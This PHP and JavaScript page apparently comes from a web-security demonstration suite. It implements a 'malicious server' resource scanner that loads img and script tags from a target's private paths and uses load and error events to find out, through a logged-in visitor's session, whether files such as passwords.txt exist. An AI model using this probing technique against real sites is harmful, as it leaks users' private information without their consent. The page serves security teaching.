<?php
include('../declare.php');

$title = "Malicious server prototype: Resource scanner";

ob_start();
?>
<script type="text/javascript">
function gotFile(ev, ok, file) {
  var elt = document.getElementById('results');
  if (ok) {
    elt.textContent += 'Found file ' + file + '\n';
  } else {
    elt.textContent += 'Unable to find file ' + file + '\n';
  }
}
function fileError(ev) {
  var results = document.getElementById('results');
  var str = '';
  var elt = ev.srcElement;
  var file = elt.src;
  results.textContent += 'Unable to find file ' + file + '\n';
}
function fileLoad(ev) {
  var results = document.getElementById('results');
  var str = '';
  var elt = ev.srcElement;
  var file = elt.src;
  results.textContent += 'Found file ' + file + '\n';
}
</script>
<?
$header = ob_get_clean();

include('../inc/header.php');
?>
<h1>Resource scanner</h1>
<p class="instructions">
This page includes img and script tags that link to the target server.
The files are intended to be private, so that only a logged-in user
should be able to access them. However, this page is able to exploit the
logged-in status of the user (if that is the case) to determine whether
the files exist or not.
</p>
<div id='scans'>
</div>
<!--
<img src="<?=TGTROOT?>private/secret.png" onerror="gotFile(false, 'secret.png')" onload="gotFile(true, 'secret.png')" />
<img src="<?=TGTROOT?>private/notexist.png" onerror="gotFile(false, 'notexist.png')" onload="gotFile(true, 'notexist.png')" />
<img src="<?=TGTROOT?>private/passwords.txt" onerror="gotFile(false, 'passwords.txt')" onload="gotFile(true, 'passwords.txt')" ></iframe>
-->
<br/>
<pre id="results"></pre>
<script type="text/javascript">
var files = ['secret.png', 'notexist.png', 'passwords.txt'];
var elt = document.getElementById('scans');
for (var i in files) {
  var child;
  var file = files[i];
  if (file.indexOf('.txt') == file.length - 4) {
    child = document.createElement('script');
    child.addEventListener('error', fileError);
    child.addEventListener('load', fileLoad);
  } else {
    child = document.createElement('img');
    child.addEventListener('error', fileError);
    child.addEventListener('load', fileLoad);
  }
  child.src = "<?=TGTROOT?>private/" + file;
  elt.appendChild(child);
}
</script>
<?
$links = array(
  'scanning start' => TGTROOT."scanning/start",
);
include('../inc/footer.php');
?>
